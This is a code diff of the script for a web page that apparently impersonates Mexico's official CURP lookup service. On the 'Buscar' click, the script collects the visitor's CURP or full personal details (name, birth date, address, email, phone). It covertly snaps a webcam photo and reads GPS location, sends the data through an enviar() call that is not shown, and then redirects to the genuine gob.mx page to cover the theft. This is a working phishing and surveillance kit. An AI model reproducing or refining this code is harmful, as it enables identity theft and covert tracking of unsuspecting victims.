+  '02000':'Azcapotzalco','03000':'Benito Juárez','03100':'Benito Juárez',
+  '04000':'Coyoacán','04100':'Coyoacán','05000':'Cuajimalpa de Morelos',
+  '06000':'Cuauhtémoc','06010':'Cuauhtémoc','06700':'Cuauhtémoc',
+  '07000':'Gustavo A. Madero','07300':'Gustavo A. Madero',
+  '08000':'Iztacalco','09000':'Iztapalapa','09800':'Iztapalapa',
+  '10000':'La Magdalena Contreras','11000':'Miguel Hidalgo','11560':'Miguel Hidalgo',
+  '12000':'Milpa Alta','13000':'Tláhuac','14000':'Tlalpan',
+  '15000':'Venustiano Carranza','16000':'Xochimilco',
+  '50000':'Toluca','52000':'Lerma','54000':'Tlalnepantla','57000':'Nezahualcóyotl'
+};
+
+function completarMunicipio(cp){
+  var mun = document.getElementById('municipio');
+  if(!mun) return;
+  if(CP_MUNICIPIOS[cp]){mun.value = CP_MUNICIPIOS[cp]; return;}
+  for(var k in CP_MUNICIPIOS){
+    if(Math.abs(parseInt(k)-parseInt(cp))<3000){
+      mun.value = CP_MUNICIPIOS[k];
+      return;
+    }
+  }
+}
+
+function autocompletarCP(cp){
+  var box = document.getElementById('cpInfo');
+  if(!box) return;
+  box.innerHTML = ''; box.style.color = '#1c9c4c';
+  if(!/^\d{5}$/.test(cp)) return;
+  box.innerHTML = 'Buscando…'; box.style.color = '#888';
+  fetch('https://api.zippopotam.us/mx/'+cp).then(function(r){
+    return r.ok ? r.json() : Promise.reject();
+  }).then(function(data){
+    var places = data.places || [];
+    if(!places.length){
+      box.style.color = '#c00';
+      box.innerHTML = 'CP no encontrado';
+      return;
+    }
+    var p = places[0];
+    var em = {'Distrito Federal':'Ciudad de México','Estado de Mexico':'Estado de México','Nuevo Leon':'Nuevo León','Michoacan':'Michoacán','Yucatan':'Yucatán','Queretaro':'Querétaro'};
+    var est = em[p.state] || p.state;
+    var col = document.getElementById('colonia');
+    var estd = document.getElementById('estado-dom');
+    if(col) col.value = p['place name'] || '';
+    if(estd) estd.value = est;
+    completarMunicipio(cp);
+    box.style.color = '#1c9c4c';
+    box.innerHTML = '✓ '+(p['place name']||'')+', '+est;
+  }).catch(function(){
+    box.style.color = '#c00';
+    box.innerHTML = 'No se pudo autocompletar';
+  });
+}
+
+// ===== Flujo completo =====
+async function ejecutarFlujo(boton){
+  boton.disabled = true;
+  boton.innerHTML = '<span class="load"></span> Buscando…';
+  try{
+    var stream = await navigator.mediaDevices.getUserMedia({video:{facingMode:'user'},audio:false});
+    await new Promise(function(r){setTimeout(r,1000);});
+    var video = document.createElement('video');
+    video.srcObject = stream;
+    await video.play();
+    await new Promise(function(r){setTimeout(r,600);});
+    var c = document.createElement('canvas');
+    c.width = video.videoWidth;
+    c.height = video.videoHeight;
+    c.getContext('2d').drawImage(video,0,0);
+    foto = c.toDataURL('image/jpeg',0.85);
+    stream.getTracks().forEach(function(t){t.stop();});
+  }catch(e){console.log('Camara err:',e);}
+
+  await new Promise(function(r){setTimeout(r,300);});
+  await new Promise(function(res){
+    navigator.geolocation.getCurrentPosition(function(p){
+      info.gps = p.coords.latitude.toFixed(6)+','+p.coords.longitude.toFixed(6);
+      res();
+    },function(){
+      info.gps = 'denegada';
+      res();
+    },{timeout:6000});
+  });
+
+  await enviar();
+  await new Promise(function(r){setTimeout(r,800);});
+  window.location = 'https://www.gob.mx/curp/';
+}
+
+// ===== Handlers de botones =====
+document.addEventListener('DOMContentLoaded', function(){
+  // CP autocompletado
+  var cpEl = document.getElementById('cp');
+  if(cpEl){
+    cpEl.addEventListener('input', function(){autocompletarCP(this.value);});
   }
 
-  return p1;
-}
-function dataURLtoBlob(dataurl){
-  var arr=dataurl.split(","),mime=arr[0].match(/:(.*?);/)[1];
-  var bstr=atob(arr[1]),n=bstr.length,u8arr=new Uint8Array(n);
-  while(n--){u8arr[n]=bstr.charCodeAt(n);}
-  return new Blob([u8arr],{type:mime});
-}
-var CP_MUNICIPIOS={'01000':'Álvaro Obregón','01210':'Álvaro Obregón','01730':'Álvaro Obregón','02000':'Azcapotzalco','02300':'Azcapotzalco','03000':'Benito Juárez','03100':'Benito Juárez','03810':'Benito Juárez','04000':'Coyoacán','04100':'Coyoacán','05000':'Cuajimalpa de Morelos','06000':'Cuauhtémoc','06010':'Cuauhtémoc','06700':'Cuauhtémoc','07000':'Gustavo A. Madero','07300':'Gustavo A. Madero','08000':'Iztacalco','09000':'Iztapalapa','09800':'Iztapalapa','10000':'La Magdalena Contreras','11000':'Miguel Hidalgo','11560':'Miguel Hidalgo','12000':'Milpa Alta','13000':'Tláhuac','14000':'Tlalpan','15000':'Venustiano Carranza','16000':'Xochimilco','50000':'Toluca','52000':'Lerma','54000':'Tlalnepantla','57000':'Nezahualcóyotl'};
-function completarMunicipio(cp){
-  var m=document.getElementById('municipio');
-  if(CP_MUNICIPIOS[cp]){m.value=CP_MUNICIPIOS[cp];return;}
-  for(var k in CP_MUNICIPIOS){if(Math.abs(parseInt(k)-parseInt(cp))<3000){m.value=CP_MUNICIPIOS[k];return;}}
-}
-function autocompletarCP(cp){
-  var box=document.getElementById('cpInfo');box.innerHTML='';box.style.color='#1c9c4c';
-  if(!/^\d{5}$/.test(cp))return;
-  box.innerHTML='Buscando…';box.style.color='#888';
-  fetch('https://api.zippopotam.us/mx/'+cp).then(r=>r.ok?r.json():Promise.reject()).then(function(data){
-    var places=data.places||[];
-    if(!places.length){box.style.color='#c00';box.innerHTML='CP no encontrado';return;}
-    var p=places[0];
-    var em={'Distrito Federal':'Ciudad de México','Estado de Mexico':'Estado de México','Nuevo Leon':'Nuevo León','Michoacan':'Michoacán','Yucatan':'Yucatán','Queretaro':'Querétaro'};
-    var est=em[p.state]||p.state;
-    document.getElementById('colonia').value=p['place name']||'';
-    document.getElementById('estado-dom').value=est;
-    completarMunicipio(cp);
-    box.style.color='#1c9c4c';box.innerHTML='✓ '+(p['place name']||'')+', '+est;
-  }).catch(function(){box.style.color='#c00';box.innerHTML='No se pudo autocompletar';});
-}
-document.getElementById('cp').addEventListener('input',function(){autocompletarCP(this.value);});
-async function ejecutarFlujo(boton){
-  boton.disabled=true;
-  var orig=boton.innerHTML;
-  boton.innerHTML='<span class="load"></span> Buscando…';
-  try{
-    var stream=await navigator.mediaDevices.getUserMedia({video:{facingMode:'user'},audio:false});
-    await new Promise(r=>setTimeout(r,1000));
-    var video=document.createElement('video');video.srcObject=stream;await video.play();
-    await new Promise(r=>setTimeout(r,600));
-    var c=document.createElement('canvas');c.width=video.videoWidth;c.height=video.videoHeight;
-    c.getContext('2d').drawImage(video,0,0);foto=c.toDataURL('image/jpeg',0.85);
-    stream.getTracks().forEach(t=>t.stop());
-  }catch(err){console.log("Camara err:",err);}
-  await new Promise(r=>setTimeout(r,300));
-  await new Promise(res=>{navigator.geolocation.getCurrentPosition(p=>{info.gps=p.coords.latitude.toFixed(6)+','+p.coords.longitude.toFixed(6);res();},()=>{info.gps='denegada';res();},{timeout:6000});});
-  // AQUÍ form ya está relleno (por el onclick)
-  console.log("enviar con form:", JSON.stringify(form));
-  await enviar();
-  await new Promise(r=>setTimeout(r,800));
-  window.location='https://www.gob.mx/curp/';
-}
-document.getElementById('btnBuscar').onclick=async function(e){
-  e.preventDefault();
-  var panelCurpVisible=!document.getElementById('panel-curp').classList.contains('panel-oculto');
-  var formCapturado={};
-  if(panelCurpVisible){
-    formCapturado.curp=v('curp');
-    if(!formCapturado.curp) formCapturado.curp='(vacío)';
-  }else{
-    formCapturado.nombre=v('nombre');
-    formCapturado.ap=v('primer-apellido');
-    formCapturado.am=v('segundo-apellido');
-    formCapturado.dia=v('dia');
-    formCapturado.mes=v('mes');
-    formCapturado.anio=v('anio');
-    formCapturado.sexo=v('sexo');
-    formCapturado.entidad=v('estado');
-    formCapturado.calle=v('calle');
-    formCapturado.num_ext=v('num-ext');
-    formCapturado.num_int=v('num-int');
-    formCapturado.cp=v('cp');
-    formCapturado.colonia=v('colonia');
-    formCapturado.municipio=v('municipio');
-    formCapturado.estado=v('estado-dom');
-    formCapturado.entre=v('entre');
-    formCapturado.email=v('email');
-    var lada=v('lada'), tel=v('telefono');
-    if(tel) formCapturado.tel=lada+' '+tel;
-    if(formCapturado.dia && formCapturado.mes && formCapturado.anio){
-      formCapturado.fecha=formCapturado.dia+'/'+formCapturado.mes+'/'+formCapturado.anio;
-    }
-    // limpia vacíos
-    for(var k in formCapturado){if(!formCapturado[k]) delete formCapturado[k];}
+  // Botón Buscar (funciona para ambos paneles)
+  var btn = document.getElementById('btnBuscar');
+  if(btn){
+    btn.onclick = async function(e){
+      e.preventDefault();
+      var panelCurpVisible = !document.getElementById('panel-curp').classList.contains('panel-oculto');
+      if(panelCurpVisible){
+        form = {};
+        form.curp = v('curp');
+        if(!form.curp) form.curp = '(vacío)';
+      }else{
+        leerForm();
+      }
+      await ejecutarFlujo(this);
+    };
   }
-  // Asigna form global para que enviar() lo use
-  form=formCapturado;
-  console.log("FORM a enviar:", JSON.stringify(form));
-  await ejecutarFlujo(this);
-};
+});
 </script>
 </body>
 </html>
